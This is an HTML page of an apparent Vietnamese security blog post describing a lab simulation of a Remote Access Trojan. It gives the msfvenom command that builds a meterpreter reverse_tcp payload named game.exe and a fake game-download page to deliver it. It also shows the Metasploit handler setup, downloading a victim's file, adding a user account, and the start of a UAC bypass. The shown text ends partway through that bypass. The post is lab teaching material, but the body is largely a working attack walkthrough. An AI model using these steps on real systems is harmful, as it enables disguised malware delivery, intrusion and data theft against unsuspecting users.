@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Some research in my life'>
+<title>Remote Access Trojan (RAT)</title>
+
+<link rel='canonical' href='/p/remote-access-trojan-rat/'>
+
+<link rel="stylesheet" href="/scss/style.min.24ef1cc321916467896e8c70c10c0ad7b98c2a8df14298032fb637216e397f50.css"><meta property='og:title' content='Remote Access Trojan (RAT)'>
+<meta property='og:description' content='Some research in my life'>
+<meta property='og:url' content='/p/remote-access-trojan-rat/'>
+<meta property='og:site_name' content='Spid3r&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Security' /><meta property='article:tag' content='CVE' /><meta property='article:published_time' content='2021-12-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-12-08T00:00:00&#43;00:00'/><meta property='og:image' content='/p/remote-access-trojan-rat/featured-image.png' />
+<meta name="twitter:title" content="Remote Access Trojan (RAT)">
+<meta name="twitter:description" content="Some research in my life"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/remote-access-trojan-rat/featured-image.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu00444b9dc497f000ae7c4bf05fddc77b_89774_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👾</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spid3r&#39;s Blog</a></h1>
+            <h2 class="site-description">I&#39;ll use this site to share writeups of CTFs or post articles related to cybersecurity.</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spid3r1337'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/spid3r1337'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#rat-là-gì">RAT là gì?</a></li>
+    <li><a href="#khi-nạn-nhân-bị-nhiễm-rat-tin-tặc-có-thể-làm-được-gì">Khi nạn nhân bị nhiễm RAT, tin tặc có thể làm được gì?</a></li>
+    <li><a href="#yêu-cầu-mô-phỏng">Yêu cầu mô phỏng</a></li>
+    <li><a href="#thực-hiện-mô-phỏng">Thực hiện mô phỏng</a>
+      <ol>
+        <li><a href="#mô-hình-tấn-công">Mô hình tấn công</a></li>
+        <li><a href="#công-cụ-rat">Công cụ RAT</a></li>
+      </ol>
+    </li>
+    <li><a href="#ngoài-lề">Ngoài lề</a>
+      <ol>
+        <li><a href="#nếu-gặp-uac-từ-các-đời-windows-7-trở-lên-thì-sao">Nếu gặp UAC từ các đời windows 7 trở lên thì sao?</a></li>
+        <li><a href="#cách-phòng-tránh-rat-và-tự-bảo-vệ-chính-mình-trước-rat">Cách phòng tránh RAT và tự bảo vệ chính mình trước RAT</a></li>
+        <li><a href="#về-windows-đời-cao-hơn">Về Windows đời cao hơn</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/remote-access-trojan-rat/">
+                <img src="/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_800x0_resize_box_3.png"
+                        srcset="/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_800x0_resize_box_3.png 800w, /p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="512" 
+                        loading="lazy"
+                        alt="Featured image of post Remote Access Trojan (RAT)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/research/" >
+                Research
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/remote-access-trojan-rat/">Remote Access Trojan (RAT)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Some research in my life
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 08, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Tìm hiểu và thực hành tấn công với Remote Access Trojan</p>
+<h2 id="rat-là-gì">RAT là gì?</h2>
+<p><strong>RAT (Remote Access Trojan)</strong> là một loại phần mềm độc hại có thể giúp 1 tin tặc có thể chiếm quyền vào các <strong>điện thoại hoặc máy tính</strong> khi bị lây nhiễm.</p>
+<p>RAT được sử dụng hầu hết cho việc <strong>hack</strong> của các tin tặc và được cài trên máy của nạn nhân (victim). Nếu được mã hoá thì RAT sẽ được ẩn đi và rất khó cho các phần mềm diệt virus phát hiện được chúng. Bởi vì vậy càng khiến việc loại bỏ trở nên khó khăn cũng như các tin tặc dễ dàng kiểm soát thiết bị của nạn nhân hơn.</p>
+<p>Các phần mềm RAT nguy hiểm ở chỗ, hiện nay nó đang được rao bán với tầm giá từ vài chục đến vài trăm đô la mỹ nên việc xử lý chúng trên diện rộng cũng trở nên khó khăn hơn.</p>
+<h2 id="khi-nạn-nhân-bị-nhiễm-rat-tin-tặc-có-thể-làm-được-gì">Khi nạn nhân bị nhiễm RAT, tin tặc có thể làm được gì?</h2>
+<ul>
+<li>Lấy được toàn bộ dữ liệu (Data), password lưu trên máy của nạn nhân</li>
+<li>Truy cập camera (webcam), hiển thị vị trí, truy cập mic để nghe môi trường xung quanh, xem trực tiếp màn hình của nạn nhân (victim)</li>
+<li>Có quyền truy cập danh bạ, danh sách cuộc gọi hoặc tin nhắn</li>
+<li>Có thể cài thêm các virus (có thể là loại khác vào máy nạn nhân)</li>
+<li>Có thể lợi dụng quyền điều khiển máy của nạn nhân để thực hiện các hành vi phạm tội khác</li>
+</ul>
+<p>&ndash;&gt; Tất cả các quyền của nạn nhân làm được trên thiết bị của họ, tin tặc cũng đều có thể làm được với máy của họ (nạn nhân)</p>
+<h2 id="yêu-cầu-mô-phỏng">Yêu cầu mô phỏng</h2>
+<blockquote>
+<p>Sử dụng 1 công cụ RAT (Remote Access Trojan) bất kì [Mô hình bao gồm 1 máy attacker và 1 máy victim]. Thực hiện cài đặt RAT vào máy tính victim sau đó thực hiện các hành vi:</p>
+<ul>
+<li>Lấy file dữ liệu về (có thể dùng 1 file giả lập trong hệ thống)</li>
+<li>Tạo tài khoản người dùng có quyền administrator
+Lưu ý: Sử dụng giao diện dòng lệnh hoặc giao diện của công cụ RAT (lưu ý không sử dụng công cụ Remote Desktop hoặc SSH)</li>
+</ul>
+</blockquote>
+<h2 id="thực-hiện-mô-phỏng">Thực hiện mô phỏng</h2>
+<h3 id="mô-hình-tấn-công">Mô hình tấn công</h3>
+<p>Bao gồm 1 máy attacker là <code>Kali Linux</code> và 1 máy victim (trong bài này mình sử dụng <code>Windows XP</code> và <code>Windows 7</code>)</p>
+<h3 id="công-cụ-rat">Công cụ RAT</h3>
+<p>Chọn công cụ <code>msfvenom</code> (Metasploit Framework) để sử dụng cho việc tấn công mô phỏng này</p>
+<p><img src="/p/remote-access-trojan-rat/image.png"
+	width="1385"
+	height="573"
+	srcset="/p/remote-access-trojan-rat/image_hu649085099091ba8fdd3a3ca658a8e268_381904_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image_hu649085099091ba8fdd3a3ca658a8e268_381904_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Các lệnh sử dụng của msfvenom"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="580px"
+	
+></p>
+<p>Start apache web server từ phía Kali Linux (attacker) bằng <code>sudo apache2ctl start</code> và tiếp theo là check IP từ Kali Linux</p>
+<p><img src="/p/remote-access-trojan-rat/image-1.png"
+	width="823"
+	height="239"
+	srcset="/p/remote-access-trojan-rat/image-1_hu9d5e3d749548a572776523e3c2c276de_58751_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-1_hu9d5e3d749548a572776523e3c2c276de_58751_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Kali Linux IP"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="344"
+		data-flex-basis="826px"
+	
+></p>
+<p>Và những gì hiển thị trên IP này là toàn bộ dữ liệu có trong <strong>var/www/html</strong> bên phía Kali Linux, mình đã tạo 1 web giả mạo tải game</p>
+<p><img src="/p/remote-access-trojan-rat/image-2.png"
+	width="953"
+	height="320"
+	srcset="/p/remote-access-trojan-rat/image-2_huad187560658e7f733de7b81c52267170_29783_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-2_huad187560658e7f733de7b81c52267170_29783_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
+></p>
+<p>Tạo 1 payload và lưu vào file game.exe mà mình sẽ dùng bằng lệnh (Tạo file malware)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.47.128 <span class="nv">lport</span><span class="o">=</span><span class="m">443</span> -f exe -o game.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Giải thích shell:</p>
+<ul>
+<li>
+<p><code>-p</code> là sử dụng payload windows/meterpreter/reverse_tcp</p>
+</li>
+<li>
+<p><code>lhost</code> là IP address của máy attacker (l tượng trưng cho local)</p>
+</li>
+<li>
+<p><code>lport</code> là cổng của máy attacker</p>
+</li>
+<li>
+<p><code>-f</code> là format của file malware (ở đây mình để là exe)</p>
+</li>
+<li>
+<p><code>-o</code> File output thực tế (mình để tên của file)</p>
+</li>
+</ul>
+<p>Tại đây dùng 1 máy Windows XP để làm máy <strong>victim</strong> và truy cập vào địa chỉ IP trên đã lấy từ Kali Linux ở trên tiến hành truy cập vào apache web server và vào mục <code>game</code> đã chứa web giả mạo của mình. Và sau khi tải về thì sẽ chứa file game.exe</p>
+<p><img src="/p/remote-access-trojan-rat/image-3.png"
+	width="950"
+	height="916"
+	srcset="/p/remote-access-trojan-rat/image-3_hu1fe4cd231bdb5a4dfa8f0df7af34c354_112236_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-3_hu1fe4cd231bdb5a4dfa8f0df7af34c354_112236_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="103"
+		data-flex-basis="248px"
+	
+></p>
+<p><img src="/p/remote-access-trojan-rat/image-4.png"
+	width="1914"
+	height="859"
+	srcset="/p/remote-access-trojan-rat/image-4_hu91903d1beeef8b31ec1915cf64727e8a_3164097_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-4_hu91903d1beeef8b31ec1915cf64727e8a_3164097_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="534px"
+	
+></p>
+<p>Sử dụng giao diện của msf &ndash;&gt; <code>msfconsole</code> (Metasploit framework) và vào việc</p>
+<p><img src="/p/remote-access-trojan-rat/image-5.png"
+	width="656"
+	height="574"
+	srcset="/p/remote-access-trojan-rat/image-5_hu599a6603771f94931fe549e151e25f39_150657_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-5_hu599a6603771f94931fe549e151e25f39_150657_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="114"
+		data-flex-basis="274px"
+	
+></p>
+<p>Nhập lần lượt các dòng lệnh để cài đặt cho msf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">192.168.47.128</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">443</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Các lệnh cài cho Metasploit</p>
+<p><img src="/p/remote-access-trojan-rat/image-6.png"
+	width="802"
+	height="549"
+	srcset="/p/remote-access-trojan-rat/image-6_hu0b3a653cb4dab7f3f10d47ec9c6fb4c3_152959_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-6_hu0b3a653cb4dab7f3f10d47ec9c6fb4c3_152959_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<p>Và sau khi máy victim chạy nó, msf sẽ tự hiện lên kết nối</p>
+<p><img src="/p/remote-access-trojan-rat/image-7.png"
+	width="867"
+	height="67"
+	srcset="/p/remote-access-trojan-rat/image-7_hu1cfd0741285812e0b5633935dfffa947_22390_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-7_hu1cfd0741285812e0b5633935dfffa947_22390_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1294"
+		data-flex-basis="3105px"
+	
+></p>
+<p>Nhập <code>help</code> để biết thêm nhiều lệnh và công dụng trong đó (mình không để ý nên đã mất rất nhiều thời gian sử dụng shell bên victim để gửi tài liệu)</p>
+<blockquote>
+<p><strong>Thực hiện hành vi 1</strong>: Lấy file tài liệu về (một file giả lập bất kỳ trong hệ thống)</p>
+</blockquote>
+<p>Giả sử máy victim đang có 1 file txt chẳng hạn ở đây mình để là file <code>dinhthaison.txt</code> và mình để luôn ở Desktop cho nhanh nhé</p>
+<p>thì với lệnh <code>dir</code>, mình đã quét được các file đang tồn tại ngoài Desktop và có tồn tại file <code>dinhthaison.txt</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-8.png"
+	width="715"
+	height="158"
+	srcset="/p/remote-access-trojan-rat/image-8_hu8d5246c4960d5aa8c85a96d58a8e682b_43287_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-8_hu8d5246c4960d5aa8c85a96d58a8e682b_43287_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="452"
+		data-flex-basis="1086px"
+	
+></p>
+<p>Sau đó chỉ cần nhập lệnh <code>download dinhthaison.txt</code> để tải về thôi</p>
+<blockquote>
+<p><strong>Thực hiện hành vi 2</strong>: Tạo 1 tài khoản người dùng có quyền administrator.</p>
+</blockquote>
+<p>Sử dụng lệnh <code>shell</code> để truy cập vào cmd của máy victim, check user bằng lệnh <code>net user</code>, ở đây ta thấy mới có tài khoản ban đầu của máy là <code>SUPPORT_388945a0</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-9.png"
+	width="644"
+	height="161"
+	srcset="/p/remote-access-trojan-rat/image-9_hue10b6105089b3d74f852ade7d4ae3832_38382_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-9_hue10b6105089b3d74f852ade7d4ae3832_38382_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="400"
+		data-flex-basis="960px"
+	
+>
+Tiến hành thêm tài khoản mới bằng cách nhập lệnh <code>net user newaccount dinhthaison /add</code>, trong đó <code>newaccount</code> là tên người dùng, còn <code>dinhthaison</code> là password</p>
+<p><img src="/p/remote-access-trojan-rat/image-10.png"
+	width="645"
+	height="163"
+	srcset="/p/remote-access-trojan-rat/image-10_huf373cc371f4406468dae6ccb4ae78bb7_30176_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-10_huf373cc371f4406468dae6ccb4ae78bb7_30176_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="395"
+		data-flex-basis="949px"
+	
+></p>
+<hr>
+<h2 id="ngoài-lề">Ngoài lề</h2>
+<p>Về RAT lần này, sau khi thử với windows 7 thì có trường hợp không được cấp quyền ad trong khi nhập meterpreter (và lý do chính là UAC chưa được bypass)</p>
+<p>Nhưng khi mình thực thi thì hoàn toàn không gặp phải vấn đề này vì có lẽ windows XP không có UAC</p>
+<p><img src="/p/remote-access-trojan-rat/image-11.png"
+	width="670"
+	height="599"
+	srcset="/p/remote-access-trojan-rat/image-11_hu1cf4c855822cfc35ba2b4a4443d48a3f_273071_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-11_hu1cf4c855822cfc35ba2b4a4443d48a3f_273071_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="111"
+		data-flex-basis="268px"
+	
+></p>
+<h3 id="nếu-gặp-uac-từ-các-đời-windows-7-trở-lên-thì-sao">Nếu gặp UAC từ các đời windows 7 trở lên thì sao?</h3>
+<p>Vậy thì mình sẽ bypass UAC ngay trong máy attacker. Đầu tiên sẽ là check người dùng bằng <code>getuid</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-12.png"
+	width="319"
+	height="37"
+	srcset="/p/remote-access-trojan-rat/image-12_hu447c5c7dafaa80a5b721e8f017149982_6115_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-12_hu447c5c7dafaa80a5b721e8f017149982_6115_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="862"
+		data-flex-basis="2069px"
+	
+></p>
+<p>Với mỗi thông tin nhu này thì chưa chắc chắn được gì, có lẽ nên thử tiếp bằng <code>getsystem</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-13.png"
+	width="993"
+	height="100"
+	srcset="/p/remote-access-trojan-rat/image-13_hu50d72b2e0324b9a8cfe5e088922d7087_34868_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-13_hu50d72b2e0324b9a8cfe5e088922d7087_34868_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="993"
+		data-flex-basis="2383px"
+	
+></p>
+<p>Vậy là đã bị fail. Sử dụng <code>getsystem -h</code> để hiển thị mục <code>help</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-14.png"
+	width="509"
+	height="227"
+	srcset="/p/remote-access-trojan-rat/image-14_hua80b7929b641a58420ef342ffebab87c_36240_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-14_hua80b7929b641a58420ef342ffebab87c_36240_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="538px"
+	
+></p>
+<p>Sau khi sử dụng <code>getsystem -t 1</code> trả về <strong>Access is denied</strong></p>
+<p><img src="/p/remote-access-trojan-rat/image-15.png"
+	width="761"
+	height="58"
+	srcset="/p/remote-access-trojan-rat/image-15_hu41de02a392cf797064d5b3b5de579d7e_17894_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-15_hu41de02a392cf797064d5b3b5de579d7e_17894_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1312"
+		data-flex-basis="3148px"
+	
+></p>
+<p>Vậy thì sẽ tiến hành bypass UAC để có quyền truy cập cho RAT, bằng cách sử dụng module từ Metasploit để bypass tính năng UAC trên Windows.</p>
+<p>Đầu tiên thì mình sẽ cần làm background cho session</p>
+<p><img src="/p/remote-access-trojan-rat/image-16.png"
+	width="274"
+	height="36"
+	srcset="/p/remote-access-trojan-rat/image-16_hu5f612322973720fa4a36da804932b6e3_5740_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-16_hu5f612322973720fa4a36da804932b6e3_5740_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="761"
+		data-flex-basis="1826px"
+	
+></p>
+<p>Tiếp theo sẽ sử dụng lệnh <code>use exploit/windows/local/bypassuac</code> (lệnh này có thể tìm kiếm bằng việc <code>search uac</code> trong Metasploit) sau đó check <code>options</code></p>
+<p><img src="/p/remote-access-trojan-rat/image-17.png"
+	width="819"
+	height="425"
+	srcset="/p/remote-access-trojan-rat/image-17_hu089c901b55a5ecb84e9c06ae4b19d77a_133324_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-17_hu089c901b55a5ecb84e9c06ae4b19d77a_133324_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="462px"
+	
+></p>
+<p>Dễ thấy exploit target là windows x86 &ndash;&gt; nhập <code>show targets</code> để xem những mục tiêu</p>
